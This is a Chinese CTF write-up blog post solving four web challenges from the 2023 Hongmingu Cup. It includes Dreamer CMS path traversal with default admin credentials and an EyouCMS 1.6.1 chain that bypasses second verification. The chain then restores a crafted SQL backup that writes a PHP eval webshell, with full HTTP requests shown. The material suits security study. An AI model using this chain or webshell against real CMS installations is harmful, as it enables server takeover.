---
title: "2023 红明谷杯 Web Writeup"
date: 2023-04-30T20:03:11+08:00
lastmod: 2023-04-30T20:03:11+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 红明谷杯

<!--more-->

## 点击签到

[http://eci-2ze1elkmd44j2kaljzts.cloudeci1.ichunqiu.com/0x1337.js](http://eci-2ze1elkmd44j2kaljzts.cloudeci1.ichunqiu.com/0x1337.js)

把 js 改一改

```javascript
var _0x4a12 = `<省略>`;
function _0x3aef(_0x123456) {
    var _0xabcdef = '';
    for (var _0x10 = 0x0; _0x10 < _0x123456.length; _0x10++) {
        _0xabcdef += String.fromCharCode(_0x123456.charCodeAt(_0x10) ^ 0x2a);
    }
    return _0xabcdef;
}

function decrypt() {
    var encodedSecret = _0x4a12;
    return _0x3aef(encodedSecret);
}
```

![image-20230419121639621](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191216676.png)

## Dreamer

gitee 地址 [https://gitee.com/isoftforce/dreamer_cms](https://gitee.com/isoftforce/dreamer_cms)

管理员默认账号密码。wangjn/123456

参考 [https://gitee.com/isoftforce/dreamer_cms/issues/I6NP86](https://gitee.com/isoftforce/dreamer_cms/issues/I6NP86)

修改 themePath, 上传压缩包, 然后目录穿越

![image-20230419115830224](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191158266.png)

flag 在根目录下

![image-20230419115858792](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191158812.png)

## Dreamer_revenge

后台登录以及目录穿越的过程同上

flag 不在根目录下面, 读 `/proc/self/environ` 也没有结果

看下数据库配置文件, 有 mysql 和 redis

![image-20230419120123787](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191201811.png)

`/var/lib` 下面发现了对应的目录

![image-20230419120306700](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191203720.png)

`/var/lib/redis/`, 一开始没有 dump.rdb, 在后台随便点点然后等几分钟就有了

估计是 redis 自动缓存的问题

查看 `/etc/redis/redis.conf`发现配置了默认备份的策略

```
save 900 1
save 300 10
save 60 10000
```

![image-20230419120440492](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191204510.png)

因为可以任意文件读取, flag 就在 rdb 里面, 不过每次出现的位置都不太一样

![image-20230419120546569](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191205597.png)

## Eyou

[https://eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com/login.php](https://eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com/login.php)

后台账号密码 admin/admin123

版本为 1.6.1, 官网源码: [https://update.eyoucms.com/source/EyouCMS-V1.6.1-UTF8-SP1_0329.zip](https://update.eyoucms.com/source/EyouCMS-V1.6.1-UTF8-SP1_0329.zip)

后台可以改上传的文件后缀, 但是源码限制死了, 只要包含 php 或者不在一个预置的 array 里面就会被 unset

常规的文件上传点和 ueditor 都使用了这个配置, 绕不过去

`\app\admin\controller\System::basic`

![image-20230419122200272](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191222323.png)

后台存在模版管理的功能, 进去之后会提示二次安全验证, 可以改前端 js 阻止弹窗, 但是只要一编辑 / 新建文件又会提示 "请勿非法越过二次安全验证", 并且只能够新建 htm/css/js/txt

存在数据库备份还原的功能

![image-20230419122607509](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191226559.png)

发现文件并没有限制后缀是 .sql, 只要文件名包含 .sql 就行, 但是会有一些命名格式的限制 (sscanf 函数)

安全中心可以改数据备份路径, 所以考虑把路径换到一个可控的文件夹里面, 然后上传文件之后再去还原数据, 进而执行任意 sql 语句

因为命名格式的限制, 可控文件名的地方就只有模版管理, 但模版管理需要二次验证

Security.php 里面的 `second_verify_edit` 方法验证了原答案, 但是 `second_verify_add` 没有验证

![image-20230419123614253](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191236310.png)

构造数据包

```
POST /login.php?m=admin&c=Security&a=second_verify_add&_ajax=1&lang=cn HTTP/1.1
Host: eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com/login.php?s=Admin/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; home_lang=cn; admin_lang=cn; PHPSESSID=5fd42b46c3c6c0375b160cab41cd7f06;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

&ask=1&answer=1234
```

![image-20230419123743137](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191237184.png)

先随便备份一次数据表拿到文件名, 然后抓还原的包拿到 time 的值

到模版管理界面新建文件

```sql
-- ----------------------------------------
-- EyouCms MySQL Data Transfer 
-- 
-- Server         : 127.0.0.1_3306
-- Server Version : 10.3.38-MariaDB-0+deb10u1
-- Host           : 127.0.0.1:3306
-- Database       : eyoucms
-- 
-- Part : #1
-- Version : #v1.6.1
-- Date : 2023-04-19 11:37:28
-- -----------------------------------------

SET FOREIGN_KEY_CHECKS = 0;


-- -----------------------------
-- Table structure for `ey_ad`
-- -----------------------------
create table ey_test(id int, content text);
insert into ey_test values(1, user());
insert into ey_test values(2,version());
select '<?php phpinfo();eval($_REQUEST[1]);?>' into outfile '/var/www/html/shell.php';
```

再去安全中心更改数据库备份路径为 /template, 最后发送恢复备份的数据包

```
POST /login.php?m=admin&c=Tools&a=new_import&time=1681875679&lang=cn HTTP/1.1
Host: eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zecserefv525cst1glk.cloudeci1.ichunqiu.com/login.php?m=admin&c=Tools&a=restore&lang=cn
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; home_lang=cn; admin_lang=cn; PHPSESSID=5fd42b46c3c6c0375b160cab41cd7f06;
Connection: close

```

![image-20230419124309385](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191243459.png)

![image-20230419125017045](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191250102.png)

flag 在根目录下

![image-20230419125035954](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304191250022.png)